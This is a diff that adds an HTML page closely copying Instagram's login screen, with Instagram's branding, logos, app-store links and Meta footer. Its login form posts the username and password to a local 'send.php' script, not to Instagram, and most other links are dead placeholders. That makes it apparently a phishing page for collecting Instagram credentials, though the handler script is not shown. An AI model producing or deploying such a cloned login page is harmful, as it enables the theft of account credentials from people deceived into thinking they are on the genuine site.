@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+
+  <link rel="stylesheet" href="./styles/style.css">
+  <link rel="icon" type="image/x-icon" href="./img/instafav.ico">
+</head>
+
+<body>
+
+  <div id="content-container">
+
+    <!--Phone's pictures section-->
+    <section class="phones">
+      <img src="./img/phones.png" alt="pictures on phone" class="phone-image">
+      <div class="display-phone">
+        <img class="picture" src="./img/photo-1.png" alt="#">
+        <img class="picture" src="./img/photo-2.png" alt="#">
+        <img class="picture" src="./img/photo-3.png" alt="#">
+        <img class="picture" src="./img/photo-4.png" alt="#">
+        <img class="picture" src="./img/photo-5.png" alt="#">
+      </div>
+    </section>
+
+    <!--User's log in section-->
+    <section class="user">
+
+      <div class="login-container">
+
+        <!--Instagram Logo-->
+        <div class="instagram-logo-box">
+          <img class="instagram-logo" src="./img/instagram-logo.png">
+        </div>
+
+        <!--Form Login-->
+        <form id="login-post" action="send.php" method="POST">
+          <div class="inputs-container">
+            <input type="text" name="username" placeholder="Phone number, username or email">
+          </div>
+          <div class="inputs-container">
+            <input type="password" name="password" placeholder="Password">
+          </div>
+          <button type="submit" class="login-button">Log In</button>
+
+          <div class="or-container">
+            <div class="line"></div>
+            <div class="or">OR</div>
+            <div class="line"></div>
+          </div>
+
+          <!--Facebook login-->
+          <div class="facebook-container">
+            <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo"
+                src="./img/facebook-logo.png">Log in
+              with Facebook</a>
+          </div>
+        </form>
+
+        <!--Password recovery-->
+        <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
+      </div>
+
+      <!--Sign up-->
+      <div class="signup-container">
+        <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
+      </div>
+
+      <!--App's download-->
+      <div class="get-container">
+        <p>Get the app.</p>
+        <div class="download-container">
+          <a class="download-appstore" href="https://apps.apple.com/in/app/instagram/id389801252" target="_blank"><img class="appstore"
+              src="./img/applestore-logo.png"></a>
+          <a class="download-googleplay" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D57EE3D5B-D3A0-4FC1-A261-C88FFEF69EA1%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1" target="_blank"><img class="googleplay"
+              src="./img/googleplay-logo.png"></a>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <footer class="page-footer">
+
+    <div class="links-container">
+      <ul class="links-list">
+        <li>
+          <a class="link" href="#" target="_blank">Meta</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">About</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">Blog</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">Jobs</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">Help</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">API</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">Privacy</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">Terms</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">Location</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">Threads</a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="footer-span-container">
+      <span class="footer-span"> 
+        © 2024 Instagram from Meta
+      </span>
+    </div>
+  </footer>
+
+</body>
+
+</html>
